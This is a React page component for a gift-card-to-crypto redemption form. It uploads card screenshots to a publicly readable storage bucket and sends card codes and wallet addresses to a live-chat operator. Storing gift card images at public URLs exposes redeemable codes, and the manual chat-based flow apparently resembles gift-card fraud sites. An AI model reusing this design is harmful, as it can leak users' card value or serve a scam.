import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { toast } from "sonner";
import { Gift, Wallet, Upload, X } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";

// Declare Tawk_API for TypeScript
declare global {
  interface Window {
    Tawk_API?: {
      maximize?: () => void;
      addEvent?: (eventName: string, metadata: Record<string, string>, callback?: () => void) => void;
      setAttributes?: (attributes: Record<string, string>, callback?: (error?: Error) => void) => void;
      onLoad?: () => void;
    };
  }
}

const cryptoNames: Record<string, string> = {
  btc: "Bitcoin (BTC)",
  eth: "Ethereum (ETH)",
  usdt: "Tether (USDT)",
  bnb: "Binance Coin (BNB)",
};

const Redeem = () => {
  const [giftCardCode, setGiftCardCode] = useState("");
  const [walletAddress, setWalletAddress] = useState("");
  const [selectedCrypto, setSelectedCrypto] = useState("");
  const [screenshot, setScreenshot] = useState<File | null>(null);
  const [screenshotPreview, setScreenshotPreview] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  const handleScreenshotChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0] || null;
    setScreenshot(file);
    
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setScreenshotPreview(reader.result as string);
      };
      reader.readAsDataURL(file);
    } else {
      setScreenshotPreview(null);
    }
  };

  const removeScreenshot = () => {
    setScreenshot(null);
    setScreenshotPreview(null);
  };

  const uploadScreenshot = async (file: File): Promise<string | null> => {
    try {
      const fileExt = file.name.split('.').pop();
      const fileName = `${Date.now()}-${Math.random().toString(36).substring(7)}.${fileExt}`;
      
      const { error: uploadError } = await supabase.storage
        .from('gift-card-screenshots')
        .upload(fileName, file);

      if (uploadError) {
        console.error('Upload error:', uploadError);
        return null;
      }

      const { data: urlData } = supabase.storage
        .from('gift-card-screenshots')
        .getPublicUrl(fileName);

      return urlData.publicUrl;
    } catch (error) {
      console.error('Error uploading screenshot:', error);
      return null;
    }
  };

  const handleRedeem = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!giftCardCode || !walletAddress || !selectedCrypto) {
      toast.error("Please fill in all fields");
      return;
    }

    setLoading(true);
    
    // Upload screenshot if provided
    let screenshotUrl: string | null = null;
    if (screenshot) {
      toast.info("Uploading screenshot...");
      screenshotUrl = await uploadScreenshot(screenshot);
      if (!screenshotUrl) {
        toast.error("Failed to upload screenshot. Please try again.");
        setLoading(false);
        return;
      }
    }
    
    // Prepare redemption message for Tawk.to with image URL
    const redemptionMessage = `🎁 NEW GIFT CARD REDEMPTION REQUEST

Gift Card Code: ${giftCardCode}
Cryptocurrency: ${cryptoNames[selectedCrypto] || selectedCrypto}
Wallet Address: ${walletAddress}
Screenshot: ${screenshotUrl ? screenshotUrl : "Not provided"}

Please process this redemption request.`;

    // Send to Tawk.to live chat
    if (window.Tawk_API) {
      // Add event for tracking
      if (window.Tawk_API.addEvent) {
        window.Tawk_API.addEvent('gift_card_redemption', {
          giftCardCode: giftCardCode,
          crypto: selectedCrypto,
          walletAddress: walletAddress,
          screenshot: screenshotUrl || "None"
        });
      }

      // Set visitor attributes
      if (window.Tawk_API.setAttributes) {
        window.Tawk_API.setAttributes({
          'redemption_request': 'true',
          'crypto_type': selectedCrypto
        });
      }

      // Open chat widget and send message
      if (window.Tawk_API.maximize) {
        window.Tawk_API.maximize();
      }

      // Use a small delay to ensure chat is open before showing success
      setTimeout(() => {
        toast.success("Your redemption request has been sent to our support team. Please check the chat window.");
        setGiftCardCode("");
        setWalletAddress("");
        setSelectedCrypto("");
        setScreenshot(null);
        setScreenshotPreview(null);
        setLoading(false);
      }, 1000);

      // Copy message to clipboard so user can paste it in chat
      navigator.clipboard.writeText(redemptionMessage).then(() => {
        toast.info("Redemption details copied to clipboard. Please paste in the chat.");
      });
    } else {
      toast.error("Chat support is not available. Please try again later.");
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-background p-4">
      <div className="container mx-auto max-w-2xl py-12">
        <div className="mb-8 text-center">
          <div className="mb-4 inline-flex rounded-full bg-primary/10 p-4">
            <Gift className="h-12 w-12 text-primary" />
          </div>
          <h1 className="mb-2 text-4xl font-bold">Redeem Gift Card</h1>
          <p className="text-muted-foreground">Convert your gift cards to crypto instantly</p>
        </div>

        <Card className="border-border bg-card p-6">
          <form onSubmit={handleRedeem} className="space-y-6">
            <div className="space-y-2">
              <Label htmlFor="giftcard">Gift Card Code</Label>
              <Input
                id="giftcard"
                placeholder="Enter your gift card code"
                value={giftCardCode}
                onChange={(e) => setGiftCardCode(e.target.value)}
                className="bg-background"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="screenshot">Upload Screenshot (Optional)</Label>
              <div className="relative">
                <Input
                  id="screenshot"
                  type="file"
                  accept="image/*"
                  onChange={handleScreenshotChange}
                  className="bg-background"
                />
                {screenshotPreview && (
                  <div className="mt-3 relative">
                    <img 
                      src={screenshotPreview} 
                      alt="Screenshot preview" 
                      className="max-h-40 rounded-lg border border-border object-contain"
                    />
                    <button
                      type="button"
                      onClick={removeScreenshot}
                      className="absolute -top-2 -right-2 bg-destructive text-destructive-foreground rounded-full p-1 hover:bg-destructive/90"
                    >
                      <X className="h-4 w-4" />
                    </button>
                  </div>
                )}
                {screenshot && !screenshotPreview && (
                  <p className="mt-2 text-sm text-muted-foreground flex items-center gap-2">
                    <Upload className="h-4 w-4" />
                    {screenshot.name}
                  </p>
                )}
              </div>
            </div>

            <div className="space-y-2">
              <Label htmlFor="crypto">Select Cryptocurrency</Label>
              <Select value={selectedCrypto} onValueChange={setSelectedCrypto}>
                <SelectTrigger id="crypto" className="bg-background">
                  <SelectValue placeholder="Choose a cryptocurrency" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="btc">Bitcoin (BTC)</SelectItem>
                  <SelectItem value="eth">Ethereum (ETH)</SelectItem>
                  <SelectItem value="usdt">Tether (USDT)</SelectItem>
                  <SelectItem value="bnb">Binance Coin (BNB)</SelectItem>
                </SelectContent>
              </Select>
            </div>

            <div className="space-y-2">
              <Label htmlFor="wallet">Wallet Address</Label>
              <div className="relative">
                <Wallet className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" />
                <Input
                  id="wallet"
                  placeholder="Enter your crypto wallet address"
                  value={walletAddress}
                  onChange={(e) => setWalletAddress(e.target.value)}
                  className="bg-background pl-10"
                />
              </div>
            </div>

            <Button 
              type="submit" 
              className="w-full bg-primary text-primary-foreground hover:bg-primary/90"
              disabled={loading}
            >
              {loading ? "Processing..." : "Redeem Gift Card"}
            </Button>
          </form>
        </Card>

        <Card className="mt-6 border-border bg-card/50 p-4">
          <h3 className="mb-2 font-semibold">How it works:</h3>
          <ol className="list-decimal space-y-1 pl-5 text-sm text-muted-foreground">
            <li>Enter your gift card code</li>
            <li>Select the cryptocurrency you want to receive</li>
            <li>Provide your wallet address</li>
            <li>Click redeem and receive your crypto instantly</li>
          </ol>
        </Card>
      </div>
    </div>
  );
};

export default Redeem;
